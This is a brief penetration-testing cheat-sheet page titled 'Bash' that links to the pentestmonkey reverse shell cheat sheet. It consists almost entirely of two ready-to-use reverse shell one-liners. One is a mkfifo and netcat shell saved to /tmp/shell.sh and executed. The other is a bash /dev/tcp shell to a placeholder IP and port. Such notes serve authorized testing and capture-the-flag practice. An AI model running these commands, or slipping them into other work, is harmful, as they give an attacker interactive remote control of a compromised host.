# Bash

{% embed url="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" %}

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f" \
> /tmp/shell.sh

/bin/sh -c "bash /tmp/shell.sh"
```

```
/bin/sh -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
```
